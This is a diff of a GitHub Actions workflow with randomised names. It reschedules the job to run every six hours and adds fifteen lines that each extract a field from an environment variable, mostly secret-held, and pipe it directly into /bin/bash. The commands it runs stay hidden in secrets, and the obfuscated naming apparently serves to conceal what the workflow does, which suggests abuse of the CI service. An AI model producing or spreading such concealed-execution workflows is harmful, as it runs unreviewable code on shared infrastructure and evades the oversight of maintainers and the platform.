@@ -3,20 +3,29 @@ name: yinnengzhe7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 5/6 * * *'
-
+    - cron: '56 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yinnengzhe7654
         env:
-          rae7220: ${{ secrets.rae7220 }}
+          ohdzy002: ${{ secrets.ohdzy002 }}
         run: |
-          echo $rae7220 | jq -r .xid41093 | /bin/bash
-          echo $ogmr693 | jq -r .viu84 | /bin/bash
-          echo $hbkls3 | jq -r .xv65 | /bin/bash
-          echo $doso93 | jq -r .cbdkf78458 | /bin/bash
+          echo $ohdzy002 | jq -r .mec85 | /bin/bash
+          echo $ppvmc12652 | jq -r .pbwf1980 | /bin/bash
+          echo $ests3091 | jq -r .l93 | /bin/bash
+          echo $szjxi07 | jq -r .n84 | /bin/bash
+          echo $i6567 | jq -r .e0951 | /bin/bash
+          echo $pvwon16 | jq -r .aqvdm3 | /bin/bash
+          echo $p7445 | jq -r .fc09 | /bin/bash
+          echo $wra20 | jq -r .ubf96 | /bin/bash
+          echo $xtnwb08943 | jq -r .vogav304 | /bin/bash
+          echo $dgiwm3 | jq -r .px47 | /bin/bash
+          echo $qkbg4738 | jq -r .zqcxc88 | /bin/bash
+          echo $sla7 | jq -r .ppxbz6 | /bin/bash
+          echo $z37 | jq -r .pbj51469 | /bin/bash
+          echo $w68 | jq -r .rr77 | /bin/bash
+          echo $o27 | jq -r .dwhr8 | /bin/bash
 
